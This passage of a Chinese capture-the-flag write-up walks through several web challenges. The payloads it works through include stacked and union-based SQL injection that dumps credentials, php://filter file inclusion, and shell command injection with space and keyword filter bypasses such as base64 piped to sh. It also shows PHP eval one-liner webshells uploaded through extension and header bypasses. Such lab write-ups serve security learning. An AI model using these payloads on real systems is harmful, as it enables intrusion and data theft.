class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //1</code></pre><p>==》==逻辑或（or），只要||前后是存在的字段名或着非0的数，就判定正确==</p><ol start="2" type="1"><li>连接符，类似concat函数</li></ol><p><strong>sql_mode=pipes_as_concat</strong>：把||当成字符串连接符而非逻辑或运算，==若拼接的是列名，则会显示查询结果再拼接==</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160732988.png" alt="image-20220126160732988" style="zoom:50%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160820866.png" alt="image-20220126160820866" style="zoom:50%;"></p><p>猜测：</p><blockquote><p><strong>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，==通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||==，也就是select输入的数据||内置的一个列名 from 表名，进一步进行猜测即为selectpost进去的数据||flag fromFlag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</strong></p></blockquote><p>关键，执行的sql语句是</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select &quot;</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot;||flag from Flag&quot;</span>;<span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select xxx ||flag from Flag&quot;</span>;</code></pre><p>解法1：</p><p><code>*,1</code></p><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即<span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即查出了<span class="hljs-built_in">Flag</span>表中的所有内容+新增一列全<span class="hljs-number">1</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163149707.png" alt="image-20220126163149707" style="zoom:80%;"></p><p>解法2：</p><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> <span class="hljs-number">1</span>;<span class="hljs-built_in">set</span> sql_mode=pipes_as_concat;<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;执行两次查询，后一次<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即把<span class="hljs-built_in">select</span> <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;的结果和<span class="hljs-number">1</span>拼接生成新一列</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163217854.png" alt="image-20220126163217854" style="zoom:80%;"></p><p><a href="http://www.xianxianlabs.com/blog/2020/05/27/355.html">源码</a>，发现也是multi_query()执行多条语句产生的漏洞</p><h2 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h2><h3 id="考点文件包含伪协议"><span style="background:#ffbbff;">考点：文件包含、伪协议</span></h3><ol type="1"><li>点击超链接跳转到Archive_room.php，点击secret超链接发现秒跳转到end.php，而不显示secret超链接的文件action.php，用burpshuite抓包，得到提示内容</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127161616536.png" alt="image-20220127161616536"></p><ol start="2" type="1"><li>访问secr3t.php，发现源码</li></ol><pre><code class="hljs php+HTML">&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt;</code></pre><p>文件包含，利用伪协议读取文件，发现过滤了php://input、data://，也不能用截断</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/15063209941952.png" alt="伪协议总结"></p><p>php://filter伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然<strong>会直接当做php代码执行，看不到源代码内容</strong>（file=flag.php）</p><p>payload：</p><pre><code class="hljs awk">secr3t.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php</code></pre><p>读取flag.php源码，解密得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127162708933.png" alt="image-20220127162708933" style="zoom:50%;"></p><h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h2><h4 id="考点手注字符注入"><span style="background:#ffbbff;">考点：手注字符注入</span></h4><p>输入'回显报错提示==》有字符注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164535555.png" alt="image-20220127164535555"></p><p>输入万能密码，得到提示admin+密码：f3dd35cabf06e25a413446369583a7b8，尝试登陆无果</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164411998.png" alt="image-20220127164411998"></p><p>'后加#就不会报错，注释：</p><pre><code class="hljs 1c">输入框的时候用<span class="hljs-meta">#，在地址栏/hackbar的时候使用%23</span></code></pre><p>判断列数：</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">4</span>%<span class="hljs-number">23</span> //报错<span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //不报错，说明有三列</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164914313.png" alt="image-20220127164914313" style="zoom:50%;"></p><p>判断回显位置：</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //回显在<span class="hljs-number">2</span>，<span class="hljs-number">3</span>处</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164929580.png" alt="image-20220127164929580" style="zoom:50%;"></p><p>爆库名</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  <span class="hljs-comment">//geek</span></code></pre><p>爆当前库下表名</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span>  //geekuser,l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span></code></pre><p>爆当前库下所有列名</p><pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>  //<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span></code></pre><p>爆指定库字段</p><pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> l0ve1ysq1%<span class="hljs-number">23</span></code></pre><p>1--cl4y--wo_tai_nan_le,2--glzjin--glzjin_wants_a_girlfriend,3--Z4cHAr7zCr--biao_ge_dddd_hm,4--0xC4m3l--linux_chuang_shi_ren,5--Ayrain--a_rua_rain,6--Akko--yan_shi_fu_de_mao_bo_he,7--fouc5--cl4y,8--fouc5--di_2_kuai_fu_ji,9--fouc5--di_3_kuai_fu_ji,10--fouc5--di_4_kuai_fu_ji,11--fouc5--di_5_kuai_fu_ji,12--fouc5--di_6_kuai_fu_ji,13--fouc5--di_7_kuai_fu_ji,14--fouc5--di_8_kuai_fu_ji,15--leixiao--Syc_san_da_hacker,16--flag--flag{03addeba-bef3-4821-86bd-04c7690ea3a6}</p><p>得到flag</p><h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2><h3 id="考点命令执行过滤绕过变量拼接">考点：命令执行、过滤绕过、变量拼接</h3><blockquote><p><a href="https://www.cnblogs.com/Cl0ud/p/12313368.html">参考WP</a></p><p><a href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">个人博客，有各种绕过过滤方法，关键词**</a></p></blockquote><ol type="1"><li>执行多条bash语句：</li></ol><pre><code class="hljs 1c">;<span class="hljs-string">|   //前面的输出作为后面的输入，被吞掉</span><span class="hljs-meta">&amp;</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121137143.png" alt="image-20220130121137143" style="zoom: 67%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121159304.png" alt="image-20220130121159304" style="zoom: 67%;"></p><ol start="2" type="1"><li>发现空格被过滤，绕过方法：</li></ol><pre><code class="hljs powershell">&#123;<span class="hljs-built_in">cat</span>,flag.txt&#125; <span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<span class="hljs-built_in">cat</span>&lt;flag.txt<span class="hljs-built_in">cat</span>&lt;&gt;flag.txtkg=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;<span class="hljs-built_in">cat</span><span class="hljs-variable">$kg</span>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</code></pre><ol start="3" type="1"><li>发现关键词flag被过滤</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121238751.png" alt="image-20220130121238751" style="zoom:67%;"></p><p>先查看index.php<code>/?ip=127.0.0.1;cat$IFS$9index.php</code></p><p>得到index.php源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;  $ip = $_GET[<span class="hljs-string">&#x27;ip&#x27;</span>];  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;      <span class="hljs-comment">//$/?*&lt;&gt;&#x27;&quot;\()[]&#123;&#125;\x00-\x1f</span>    <span class="hljs-keyword">echo</span> preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);  &#125;  $a = shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;  print_r($a);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><a href="https://www.cnblogs.com/kenshinobiy/p/4443600.html">正则相关知识：</a></p><pre><code class="hljs smalltalk">一个点‘.’可以代表所有的单一字符*紧跟的一个字符的zero or more字符‘|’相当于<span class="hljs-type">OR</span> 操作：<span class="hljs-comment">&quot;(b│cd)ef&quot;</span>: 匹配含有 <span class="hljs-comment">&quot;bef&quot;</span> 或者 <span class="hljs-comment">&quot;cdef&quot;</span>的字符串;中括号[xxx]括住的内容只匹配一个单一的字符:<span class="hljs-comment">&quot;^[a-zA-Z]&quot;</span>: 匹配以字母开头的字符串;<span class="hljs-comment">&quot;[a-d]&quot;</span>: 匹配<span class="hljs-string">&#x27;a&#x27;</span> 到<span class="hljs-string">&#x27;d&#x27;</span>的单个字符 (和<span class="hljs-comment">&quot;a│b│c│d&quot;</span> 还有 <span class="hljs-comment">&quot;[abcd]&quot;</span>效果一样);</code></pre><ol start="4" type="1"><li>==flag被过滤，绕过方法：==</li></ol><pre><code class="hljs haml">拼接绕过:a=l;b=s;$a$b编码绕过：base64：echo “Y2F0IC9mbGFn”|base64-d|bash=<span class="ruby">=&gt;cat /flag</span><span class="ruby">hex：</span><span class="ruby">echo “<span class="hljs-number">636174202</span>f666c6167” <span class="hljs-params">| xxd -r -p|</span>bash</span><span class="ruby">==&gt;cat /flag</span><span class="ruby">oct：</span><span class="ruby">$(printf “\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>”)</span><span class="ruby">==&gt;ls</span></code></pre><p>payload1：变量拼接：</p><p>在flag贪婪匹配里面我们不将flag连着写，就不会匹配到，同时可以看到有$a变量，尝试覆盖它</p><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=lag;a=f;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fla</span><span class="hljs-variable">$b</span>.php</code></pre><p>payload2：过滤bash，就用sh，sh的大部分脚本都可以在bash下运行。</p><pre><code class="hljs stata">bash：echo <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span>| base64 -<span class="hljs-keyword">d</span> | bash  <span class="hljs-comment">//发现被过滤</span><span class="hljs-keyword">sh</span>：echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span>  <span class="hljs-comment">//成功</span>Y2F0IGZsYWcucGhw：<span class="hljs-keyword">cat</span> flag.php</code></pre><h4 id="奇淫技巧内联执行">“奇淫技巧”：内联执行</h4><p>内联，就是将反引号内命令的输出作为输入执行。</p><p>秒题大概就是这种做法吧......</p><p>==<strong>payload3：内联绕过，无需列出中间结果，可以一次输出多个文件内容</strong>==</p><pre><code class="hljs stata">?ip=;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span>`<span class="hljs-keyword">ls</span>`</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130123618657.png" alt="image-20220130123618657" style="zoom:67%;"></p><h2 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h2><h3 id="考点eval代码执行">考点：eval代码执行</h3><p>eval($_POST["Syc"]);</p><p><strong>运用eval()要注意几点:</strong></p><ul><li>eval函数的==参数的字符串末尾一定要有分号==</li><li><strong>eval()</strong> 返回<strong><code>NULL</code></strong>，不回显，得有echo才回显</li></ul><p>payload</p><pre><code class="hljs ini"><span class="hljs-attr">Syc</span>=echo  `ls`<span class="hljs-comment">;   //看源码，发现只有index.php</span><span class="hljs-attr">Syc</span>=echo  `ls /`<span class="hljs-comment">;  //看根目录，发现flag文件</span><span class="hljs-attr">Syc</span>=echo  `cat /flag`<span class="hljs-comment">; //得到flag</span></code></pre><h2 id="极客大挑战-2019http">[极客大挑战 2019]Http</h2><h3 id="考http大概率考http请求体header的用法">考http，大概率考http请求体header的用法</h3><p>可以用burpsuite/浏览器hackbar直接加</p><ol type="1"><li>访问网站，查看源码发现跳转文件secret.php</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130133859973.png" alt="image-20220130133859973"></p><ol start="2" type="1"><li><p>网页显示It doesn't come from'https://Sycsecret.buuoj.cn'提示不是从某网站跳转过来的==》修改Referer:https://www.Sycsecret.com</p></li><li><p>Please use "Syclover" browser==》修改User-Agent:Syclover</p></li><li><p>No!!! you can only read this locally!!!==》要从本地访问==》修改X-Forwarded-For:127.0.0.1</p></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130134240237.png" alt="image-20220130134240237"></p><h2 id="极客大挑战-2019upload">[极客大挑战 2019]Upload</h2><h3 id="考点图片头绕过php可解析后缀上传位置">考点：&lt;?、图片头绕过、php可解析后缀、上传位置</h3><p>查看源码，关键源码</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font:20px Georgia,serif;&quot;</span>&gt;</span>图片：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> &gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre><h4 id="html知识">html知识</h4><p><strong><em>div标签定义 HTML文档中的分隔（DIVision）或部分（section），表示一块</em></strong></p><p><strong><em>align是对齐属性，center：居中对齐</em></strong></p><p><strong><em>action属性规定当提交表单时，向何处发送表单数据。</em></strong></p><p>上传文件到upload_file.php，文件表单名叫file</p><ol type="1"><li>试试上传一句话木马shell.php，发现不行，返回Notimage!，前端对后缀名有限制</li></ol><pre><code class="hljs php">Content-Type: application/octet-stream<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre><ol start="2" type="1"><li><p>改成shell.php.jpg也不行，改mime:image/jpeg也不行，说明后端对文件头有限制</p></li><li><p>上传图片马，发现对<?有过滤- **==标签绕过==**：`<script language=php>eval($_POST['c']);`</p><ul><li>``<code>标准标签：&lt;?php   简写标签  &lt;?=    它是 &lt;?php echo 的简写形式,（无需闭合尾巴）   短标记(&lt;? xxx ?&gt;)，需开启([short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag)in php.ini)   asp标签(&lt;%xxx%&gt;)【禁用了&lt;?、 &lt;?php、 ?&gt;时】需开启（asp_tags）   &lt;script language=php&gt;echo  ‘123’;&lt;/script&gt; 这里不存在&lt;?，可以绕过正则对&lt;? ,&lt;?php，asp的限制   注意⚠️php&gt;7废除了asp标签和script标签   <pre><code class="hljs xml">4. 成功上传shell.jpg，但怎么让他解析呢?此法不行，后面上传.htaccess也不行，必须内容是图片开头，说明还是后缀解析问题5. <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#bbffff;&quot;</span>&gt;</span>**默认后缀php解析**<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></code></pre> ⚠默认后缀解析  phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀 php2, php3, php4, php5, phps, pht, phtm, phtml <pre><code class="hljs routeros">修改后缀php2，php3.。都不行**修改上传文件的类型为phtml，只有这样才能使网页后端执行我们的一句话木马**&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230412016.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230412016&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:67%;&quot;</span> /&gt;精简版：**这题的绕过点有三个，一个就是文件内容不能有&lt;?，还有就是文件后缀的绕过，还有图片头。**</code></pre> GIF89a? &lt;script language="php"&gt;eval($_POST[c])&lt;/script&gt; <pre><code class="hljs routeros">还有一个问题就是**上传之后的文件在哪**。**&lt;span <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background:#FF9999;&quot;</span>&gt;猜测还是常规的目录/upload下面&lt;/span&gt;**&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230719900.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230719900&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;访问11.phtml失败，说明位置不对，GET访问upload/11.phtml成功，显示图片源码&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224630667.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224630667&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;POST访问，成功&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224720182.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224720182&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;payload：POST：upload/11.phtml，POST：</code></pre> c=echo</code>cat/flag`; <pre><code class="hljs">## [ACTF2020 新生赛]Upload### 考点：php常见后缀解析绕过&gt; [参考WP](https://www.cnblogs.com/yesec/p/12403922.html)查看源码```html &lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;嘿伙计，你发现它了！                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;            &lt;/form&gt;      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</code></pre></li></ul></li></ol><p><strong><em><a href="https://blog.csdn.net/YoungStar70/article/details/64934435">onsubmit</a>表示表单提交时验证的事件,它是在表单中的确认按钮被点击时出发的，一般是js函数，函数返回其他值/不返回表单内容才能提交，函数返回false表单不会提交</em></strong>（<a href="https://zhidao.baidu.com/question/111968742.html">百度知道</a>）</p><p>前端对文件后缀有限制，审查元素删掉也不行</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214154853790.png" alt="image-20220214154853790" style="zoom: 50%;"></p><p>上传图片马，发现对上传后的文件重命名了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214155009513.png" alt="image-20220214155009513" style="zoom: 67%;"></p><p>直接访问，发现是图片</p><p>修改后缀名为11.phtml，上传成功，访问网页成功解析php</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163807480.png" alt="image-20220214163807480" style="zoom:67%;"></p><p>POST访问uplo4d/87226c8336e7d8806fd8d3324fbcda6b.phtml</p><pre><code class="hljs ebnf"><span class="hljs-attribute">c</span>=echo <span class="hljs-string">`cat  /flag`</span>;</code></pre><p>得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163848001.png" alt="image-20220214163848001" style="zoom: 50%;"></p><p>蚁剑连接后查看源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    error_reporting(<span class="hljs-number">0</span>);    <span class="hljs-comment">//设置上传目录</span>    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uplo4d&quot;</span>);    $msg = <span class="hljs-string">&quot;Upload Success!&quot;</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];        $ext = pathinfo($file_name,PATHINFO_EXTENSION);  <span class="hljs-comment">//规定新的文件后缀名为源文件后缀名</span>        <span class="hljs-keyword">if</span>(in_array($ext, [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>])) &#123;   <span class="hljs-comment">//这里不出所料,过滤了常见的php文件拓展名</span>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;nonono~ Bad file！&#x27;</span>);        &#125;        $new_file_name = md5($file_name).<span class="hljs-string">&quot;.&quot;</span>.$ext;    <span class="hljs-comment">//新的文件名为md5值加上后缀名</span>        $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $new_file_name;        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.$msg.<span class="hljs-string">&quot; Look here~ &quot;</span>.$img_path.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><blockquote><p><strong><em><a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo()</a>函数以数组的形式返回关于文件路径的信息。</em></strong></p><p>语法：pathinfo(path,options)，opyions里的PATHINFO_EXTENSION - 